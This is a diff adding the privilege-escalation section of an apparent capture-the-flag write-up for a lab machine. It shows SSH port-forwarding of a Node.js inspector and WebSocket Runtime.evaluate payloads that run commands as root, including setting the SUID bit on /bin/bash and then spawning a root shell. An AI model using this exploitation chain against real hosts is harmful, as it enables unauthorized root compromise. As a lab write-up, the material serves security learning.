@@ -118,6 +118,93 @@ ssh engineer@10.129.11.10
 
 ### Escalation of Privileges
 
+#### Our user cant use sudo -l
+
+<img width="809" height="78" alt="image" src="https://github.com/user-attachments/assets/8da9fb2e-733d-403a-8cd2-5b16cd680e34" />
 
 
+#### Now we open a terminal with ssh -L for hear and another we prove with netstat
+```bash
+ssh -L 9229:127.0.0.1:9229 engineer@10.129.11.10
+netstat -tuln | grep 9229
+```
+
+<img width="957" height="664" alt="image" src="https://github.com/user-attachments/assets/97dad7f5-0ef7-4e90-a06f-cfdf80ce3ce0" />
+
+
+#### We're going to check if we can use write were root.
+```bash
+curl -H "Content-Type: application/json" -X POST -d '{"id":1,"method":"Runtime.evaluate","params":{"expression":"require(\"fs\").writeFileSync(\"/tmp/test_root.txt\", \"HACKED\")"}}' http://127.0.0.1:9229/json/new
+ls -l /tmp/test_root.txt
+```
+
+<img width="976" height="92" alt="image" src="https://github.com/user-attachments/assets/443d2a56-720a-4334-aedc-e507c18112a6" />
+
+
+
+#### We start going to chrome://inspect
+
+#### Then on the local terminal we search the id with node and we do a exploit with bash
+```bash
+ node -e "
+                                            const WebSocket = require('ws');
+                                            const ws = new WebSocket('ws://localhost:9229/4f3e66c0-f58c-47bc-ba52-fea718d80abb');
+                                            ws.on('open', () => {
+                                              ws.send(JSON.stringify({
+                                                id: 1,
+                                                method: 'Runtime.evaluate',
+                                                params: { expression: 'require(\"child_process\").execSync(\"id\").toString()' }
+                                              }));
+                                            });
+                                            ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
+                                            "
+```
+
+<img width="996" height="413" alt="image" src="https://github.com/user-attachments/assets/3e1454dc-7f18-4428-9787-1f6a73be9a82" />
+
+
+#### Then we use the WebSockets
+```bash
+node -e "
+                                            const WebSocket = require('ws');
+                                            const ws = new WebSocket('ws://localhost:9229/4f3e66c0-f58c-47bc-ba52-fea718d80abb');
+                                            ws.on('open', () => {
+                                              ws.send(JSON.stringify({
+                                                id: 1,
+                                                method: 'Runtime.evaluate',
+                                                params: { expression: 'process.mainModule.require(\"child_process\").execSync(\"id\").toString()' }
+                                              }));
+                                            });
+                                            ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
+                                            "
+```
+
+<img width="991" height="350" alt="image" src="https://github.com/user-attachments/assets/649f30d5-b7a5-47d9-8d3e-4c42a2f21bca" />
+
+
+#### Using all the chrome DevTools.
+```bash
+ node -e "
+                                            const WebSocket = require('ws');
+                                            const ws = new WebSocket('ws://localhost:9229/4f3e66c0-f58c-47bc-ba52-fea718d80abb');
+                                            ws.on('open', () => {
+                                              ws.send(JSON.stringify({
+                                                id: 1,
+                                                method: 'Runtime.evaluate',
+                                                params: { expression: 'process.mainModule.require(\"child_process\").execSync(\"chmod +s /bin/bash\").toString()' }
+                                              }));
+                                            });
+                                            ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
+                                            "
+```
+
+<img width="994" height="323" alt="image" src="https://github.com/user-attachments/assets/44a64ae0-7c8b-4d3b-819b-384f0059df8d" />
+
+
+#### On the engineer machine we will use `bash -p` for connect and we escale to root
+
+<img width="984" height="126" alt="image" src="https://github.com/user-attachments/assets/0461dc44-6760-4dac-8848-3dcf87cfeb89" />
+
+
+<img width="541" height="461" alt="image" src="https://github.com/user-attachments/assets/ccb60205-ce54-4c4f-a577-925616d40e4a" />
 
